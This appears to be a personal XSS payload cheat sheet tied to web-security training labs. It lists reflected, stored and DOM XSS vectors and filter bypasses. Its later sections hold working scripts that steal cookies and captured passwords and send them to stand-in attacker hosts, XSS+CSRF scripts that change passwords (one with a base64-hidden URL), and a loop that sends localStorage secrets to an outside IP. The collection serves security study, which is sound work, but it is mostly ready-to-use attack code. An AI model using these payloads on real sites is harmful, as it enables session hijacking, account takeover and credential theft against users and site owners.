# xss payload

## demo

```javascript
<script>console.log('xss')</script>
```

```javascript
<script>alert(xiaofeixia)</script>
```

```html
<img src=1 onerror=alert(233)>
```

```html
<img src=1 oNeRrOr=alert`233`>
```

```javascript
<script>fetch('http://10.11.72.22/');</script>
```

## reflect

*angle brackets HTML-encoded*
```html
"onclick="alert(233)
"onfocus="alert(233)
"onmouseover="alert(233)
" autofocus onfocus=alert(document.domain) x="
```
*Breaking out of a JavaScript string*
```html
'+alert(document.domain)+'
'-alert(document.domain)-'
';alert(document.domain)//
```
*JavaScript string with single quote and backslash escaped*

```html
</script><img src=1 onerror=alert("233")>
```
```html
</script><script>alert(1)</script>
```
```html
\'-alert(2333)//
```
*custom tags*

```html
<script>
location = 'https://vulnerable-website.com/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

*SVG markup allowed*

```html
?search="><svg><animatetransform onbegin=alert(1)>
```
*canonical link tag*

```html
/?'accesskey='x'onclick='alert(1)
```
- On Windows/Linux(Chrome): `ALT+Key`
- On Windows/Linux(Firefox): `Alt+Shift+key`
- On MacOS: `CTRL+Option+X`

*JavaScript template literals*
```html
`${alert(document.domain)}`
```

*event handlers and `href` attributes blocked*
```html
<a href="javascript:alert(233)">click me</a>
```
```html
<svg><a><animate attributeName=href values=javascript:alert(233) /><text x=20 y=20>Click me</text></a>
```

*在不直接使用括号 () 的情况下执行 alert(1337)*
```html
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

## stored

*anchor href attribute with double quotes HTML-encoded*

```html
<a href="javascript:alert(document.domain)">
```

*`onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped, `&apos;`*

```html
?&apos;-alert(2333)-&apos;
```

## DOM

*`location.search` source &  `document.write` sink*
```html
"><img src=1 onerror=alert(document.domain)>
```
```javascript
"><script>alert(document.domain)</script>
" onload="alert(1)
"><svg onload=alert(1)>
```

*`location.search` source & `innerHTML` sink*

```html
"><img src=1 onerror=alert(document.domain)>
"><svg><animate onend=alert(233) attributeName=x dur=1s>
"><audio src/onerror=alert(233)>
```

*`location.search` source & jQuery anchor `href` attribute sink*
`<a id="backLink" href="javascript:alert(233)">Back</a>`
```html
javascript:alert(233)
```

*AngularJS expression with angle brackets and double quotes HTML-encoded*
```html
{{$on.constructor('alert(1)')()}}
```   

*Reflected DOM XSS*
```html
\"-alert(123)}//
```

*Stored DOM XSS*
```html
<><img src=x onerror=alert(233)>
``` 
## iframe

[`<iframe>`](../cyber/web.md#iframe)（Inline Frame，内联框架）是 HTML 中非常强大但也伴随安全争议的一个标签。

*reflected XSS vulnerability in the search functionality*
```html
<iframe src="https://vulnerable-website.com/?search="><body onresize=print()>" onload=this.style.width='100px'>
```

*jQuery selector sink using a hashchange event*
```html
<iframe src="https://vulnerable-website.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
*DOM XSS using web messages*
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

```

## cookies

```javascript
<script>fetch('https://xxx/?'+btoa(document.cookie));</script>
```
```javascript
<script>window.location='https://xxx/?'+document.cookie;</script>
```

```javascript
<img src=x onerror="window.location='https://xxx/?'+document.cookie;"/>
```

**[portswigger lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)**

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
**xss+csrf**
```bash
# 从dom中 检索 csrf 令牌
document.getElementsByName('csrf')[0].value
# 获取 cookie
document.cookie
```
*制作 CSRF Payload*
```javascript
<script>
window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 'blah@email.com');
data.append('website', 'http://blah.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>
```
---

## change password

```javascript
<script>fetch('/change_password.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:"new_password=admin123"});</script>
```
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
alert("Action executed!");
}
};
xhr.send('action=execute&new_password=admin123');
</script>
```

**[portswigger lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)**

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
**xss+csrf**

```html
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
  function dothis() {
  var username = document.getElementsByName('username')[0].value
  var password = document.getElementsByName('password')[0].value
  var token = document.getElementsByName('csrf')[0].value
  var data = new FormData();

  data.append('csrf', token);
  data.append('postId', 8); // Change '8' to correct postId
  data.append('comment', `${username}:${password}`);
  data.append('name', 'victim');
  data.append('email', 'blah@email.com');
  data.append('website', 'http://blah.com');

  fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
  });
  };
</script>
```
---

## DOM getItem

```javascript
<img src="x" onerror="setInterval(function() {fetch('http://10.10.158.224:4242?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
```
---

## CSP

[CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) 内容安全策略（Content Security Policy，简称 CSP） 是一种声明式的安全机制，主要用于检测并缓解网页中的特定类型攻击，尤其是 跨站脚本攻击（XSS） 和 数据注入攻击。

通过配置 CSP，网站管理员可以限制浏览器能够为该页面加载哪些资源（如 JavaScript、CSS、图片、字体等），以及这些资源可以从哪些可信的源加载。

*[Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)*

```html
?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="GET">Click me</button>
```

::: details HtmlInjection.html
<<< ./html/HtmlInjection.html
:::